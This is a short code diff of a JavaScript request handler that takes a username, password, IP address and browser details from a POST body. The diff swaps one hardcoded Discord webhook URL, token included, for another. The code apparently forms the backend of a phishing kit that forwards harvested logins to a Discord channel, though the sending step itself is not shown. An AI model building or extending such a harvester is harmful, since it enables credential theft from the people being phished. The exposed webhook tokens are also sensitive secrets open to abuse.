@@ -3,7 +3,7 @@ export default async function handler(req, res) {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    const webhookUrl = "https://discord.com/api/webhooks/1391032347234668624/j4v2bTS3LmLDO0Vaflk1L41T8uXFxe4BHBUs5fvI4OE_E43LH2fpjIxoBVti8ptGojCV";
+    const webhookUrl = "https://discord.com/api/webhooks/1448323191763374188/F6GPsCYjWG1zttQX4cAao5GRYi9l7r1ntrFXAY_M8pzxurIW7L1IUXOlrgc-dkImax8Z";
 
     const { username, password, timestamp, ipAddress, browserInfo } = req.body;
 
